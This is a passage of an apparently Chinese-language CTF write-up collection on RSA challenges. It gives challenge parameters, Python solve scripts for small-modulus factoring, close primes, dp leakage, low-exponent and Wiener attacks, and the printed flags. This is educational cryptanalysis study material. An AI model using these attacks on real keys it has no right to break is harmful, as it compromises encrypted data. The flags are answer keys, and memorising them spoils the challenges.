class="number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span></span><br><span class="line">q = <span class="number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span></span><br><span class="line">c = <span class="number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;b4by_R5A&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow、babyrsa-1"><a href="#ctfshow、babyrsa-1" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有n、e、c</strong></p><p>先分解大整数n</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 1455925529734358105461406532259911790807347616464991065301847</span><br><span class="line">c = 69380371057914246192606760686152233225659503366319332065009</span><br><span class="line"></span><br><span class="line">p = 1201147059438530786835365194567</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1455925529734358105461406532259911790807347616464991065301847</span></span><br><span class="line">c = <span class="number">69380371057914246192606760686152233225659503366319332065009</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1201147059438530786835365194567</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;fact0r_sma11_N&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow、easyrsa2"><a href="#ctfshow、easyrsa2" class="headerlink" title="ctfshow、easyrsa2"></a>ctfshow、easyrsa2</h4><p><strong>TAG: 简单rsa</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747</span><br><span class="line">c = 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815</span><br><span class="line">p = 149751992878258417619955913803349588855907883795437275015624379454686823076475394292360761230383018058515386650339444595</span><br><span class="line">246524276345367505681814522035068825010950620582957883108812048922184886717309007677307472277565963907119402324227023856</span><br><span class="line">527902596769190955018836727291623263893333224367236239361837356140243</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n = 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711</span><br><span class="line">c = 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062</span><br><span class="line">p = 148629777091647844246796264243541316933219734934432518942362371402056651201924476622085034421034723763998765357939318936</span><br><span class="line">167411912678961237019833852640423223833408458277374583926678987391357358691970765804588287101985728943684133878401175077</span><br><span class="line">872266031328212861797034052872034250560671628711714389757777347537077</span><br></pre></td></tr></table></figure><p>这个估计他的意思是让手搓的，但是在线的可以出来就也不手搓了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;m0_bv_hv_sv&#125;</span><br></pre></td></tr></table></figure><p>上下两部分接出来的flag是相同的，更加确定了这个应该是让用脚本自己推出来m的，但是我懒得推，估计是与e有关的。</p><h4 id="ctfshow、easyrsa6"><a href="#ctfshow、easyrsa6" class="headerlink" title="ctfshow、easyrsa6"></a>ctfshow、easyrsa6</h4><p><strong>TAG: p、q相距很近</strong></p><p>看脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line"><span class="comment"># 上面p和q的生成过程说明p和q的相差应该时不大的</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span></span><br><span class="line"><span class="comment"># c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span></span><br></pre></td></tr></table></figure><p>这个时候通过yafu还有那个在线的网站factordb.com应该都是可以解出p和q的</p><p>直接在线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p =163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;p&amp;q_4re_t00_c1o5ed&#125;</span><br></pre></td></tr></table></figure><h3 id="dp或dq泄露-n、e、c、dp"><a href="#dp或dq泄露-n、e、c、dp" class="headerlink" title="dp或dq泄露(n、e、c、dp)"></a>dp或dq泄露(n、e、c、dp)</h3><blockquote><p>dp的存在是为了在计算之中更加方便，取dp的公式为<code>dp = d % (p-1)</code></p><p>可以使用下面的脚本碰撞得出d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getd</span>(<span class="params">n, e, dp</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            x = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">            y = n % x</span><br><span class="line">            <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">                p = x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi) % phi</span><br><span class="line">    <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><p>dp换成dq亦可以此法获得d。</p></blockquote><h4 id="WUSTCTF2020-dp-leaking-1s-very-d-angerous"><a href="#WUSTCTF2020-dp-leaking-1s-very-d-angerous" class="headerlink" title="[WUSTCTF2020]dp_leaking_1s_very_d@angerous"></a>[WUSTCTF2020]dp_leaking_1s_very_d@angerous</h4><p>给出数据为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span><br><span class="line">c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span><br><span class="line">dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span><br></pre></td></tr></table></figure><p>写个小脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getd</span>(<span class="params">n, e, dp</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            x = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">            y = n % x</span><br><span class="line">            <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">                p = x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi) % phi</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = getd(n, e, dp)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="dp和dq泄露-p、q、dp、dq、c"><a href="#dp和dq泄露-p、q、dp、dq、c" class="headerlink" title="dp和dq泄露(p、q、dp、dq、c)"></a>dp和dq泄露(p、q、dp、dq、c)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">dp,dq,p,q,c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="ctfshow、easyrsa3"><a href="#ctfshow、easyrsa3" class="headerlink" title="ctfshow、easyrsa3"></a>ctfshow、easyrsa3</h4><p><strong>TAG: 共模攻击</strong></p><p>给出数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">e = 797</span><br><span class="line">n = 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span><br><span class="line">c = 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930</span><br><span class="line"></span><br><span class="line">e = 521</span><br><span class="line">n = 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span><br><span class="line">c = 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849</span><br></pre></td></tr></table></figure><p>n相同，判定所需的攻击方式为共模攻击</p><p>用我特制的脚本拿到了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sh4r3_N&#125;</span><br></pre></td></tr></table></figure><h3 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h3><h4 id="ctfshow、easyrsa4"><a href="#ctfshow、easyrsa4" class="headerlink" title="ctfshow、easyrsa4"></a>ctfshow、easyrsa4</h4><p>给出数据为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 3</span><br><span class="line">n = 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span><br><span class="line">c = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span><br></pre></td></tr></table></figure><p>符合低加密指数攻击的一般特性，加密指数指的就是加密过程中所使用的参数<em>e</em>，低加密指数说的就是这个参数很小的时候(一般等于2或3)，可以直接对这个加密后的内容c进行开方来解密。写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span></span><br><span class="line">c = <span class="number">150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span></span><br><span class="line"></span><br><span class="line">tmp = gmpy2.iroot(c, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  <span class="comment"># 防止c已经被模n过了</span></span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">        m = <span class="built_in">int</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c += n</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="e很大时-Winner’s-attack"><a href="#e很大时-Winner’s-attack" class="headerlink" title="e很大时(Winner’s attack)"></a>e很大时(Winner’s attack)</h3><h4 id="ctfshow、easyrsa5"><a href="#ctfshow、easyrsa5" class="headerlink" title="ctfshow、easyrsa5"></a>ctfshow、easyrsa5</h4><p>当e很大、d很小时采用winner’s attack攻击。先看看给出的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span><br><span class="line">n = 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span><br><span class="line">c = 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span><br></pre></td></tr></table></figure><p>三个参数很接近的时候，采用维纳攻击，我对维纳攻击的脚本编写的原理不是特别清楚，这里我只是一个脚本小子，直接<code>pip3 install owiener</code>下载维纳攻击的工具即可，编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> owiener</span><br><span class="line"></span><br><span class="line">e = <span class="number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span></span><br><span class="line">n = <span class="number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span></span><br><span class="line">c = <span class="number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span></span><br><span class="line"></span><br><span class="line">d = owiener.attack(e, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;very_biiiiig_e&#125;</span></span><br></pre></td></tr></table></figure><h3 id="已知p高位攻击"><a href="#已知p高位攻击" class="headerlink" title="已知p高位攻击"></a>已知p高位攻击</h3><h4 id="ctfshow、easyrsa7"><a href="#ctfshow、easyrsa7" class="headerlink" title="ctfshow、easyrsa7"></a>ctfshow、easyrsa7</h4><p>给出的条件为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line">p&gt;&gt;128&lt;&lt;128 = 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000</span><br><span class="line">n = 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3</span><br><span class="line">c = 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691</span><br></pre></td></tr></table></figure><p>给出了p的高位，这时候可以利用Coppersmith攻击来恢复p，这个我现在也不是特别了解原理，明天再看看。</p><h3 id="复杂的RSA"><a href="#复杂的RSA" class="headerlink" title="复杂的RSA"></a>复杂的RSA</h3><blockquote><p>​这里把下面的所有的RSA的题目全部归类为复杂的rsa题目，既能归为复杂，必然是用到的不仅仅是rsa的知识，或者就是有多重加密的嵌套，但是起主要作用的还是rsa亦可归为此类之中。</p><p>​现在的比赛的题目大多数都是这种了，就是给你一个用来加密的脚本，让你自己找加密中的脆弱的地方，从而实现破解。</p></blockquote><h4 id="MRCTF2020-babyRSA"><a href="#MRCTF2020-babyRSA" class="headerlink" title="[MRCTF2020]babyRSA"></a>[MRCTF2020]babyRSA</h4><p>给出的加密的脚本为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 